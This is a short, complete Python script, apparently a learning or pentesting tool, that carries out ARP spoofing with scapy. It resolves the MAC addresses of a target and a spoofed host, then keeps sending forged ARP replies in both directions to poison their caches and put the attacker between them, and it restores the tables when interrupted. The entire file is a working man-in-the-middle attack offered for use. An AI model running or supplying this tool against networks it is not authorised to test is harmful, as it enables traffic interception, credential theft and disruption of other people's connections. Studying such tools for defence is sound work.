#!/usr/bin/env python3

import scapy.all as scapy
import time
import argparse

# Collecting aruments from command line
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target_ip', help='Target IP', required=True)
    parser.add_argument('-s', '--spoof', dest='spoof_ip', help='The IP you are spoofing', required=True)
    return parser.parse_args()

# Getting MAC address of device by ip passed in argument
def get_mac(ip):
    arp_frame = scapy.ARP(pdst=ip)
    ether_frame = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    frame = ether_frame / arp_frame
    answered_list = scapy.srp(frame, timeout=1, verbose=False)[0]
    
    return answered_list[0][1].hwsrc

# Spoof ARP table of target IP
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.sendp(packet, verbose=False)

# Restore ARP table of destination IP
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.Ether(dst=destination_mac) / scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.sendp(packet, verbose=False)

# Whole process :)
def main():
    options = get_arguments()
    sent_packets_count = 0
    target_ip = options.target_ip
    spoof_ip = options.spoof_ip
    try:
        print('[!] Starting the spoofing')
        while True:
            spoof(target_ip, spoof_ip)
            spoof(spoof_ip, target_ip)
            sent_packets_count+=2
            print(f'\r[+] Packets sent: {sent_packets_count}', end='')
            time.sleep(2)
    except KeyboardInterrupt:
        print('\n[!] User pressed CTRL + C\n[!] Resetting ARP tables, ending spoofing...')
        restore(target_ip, spoof_ip)
        restore(spoof_ip, target_ip)

if __name__ == '__main__':
    main()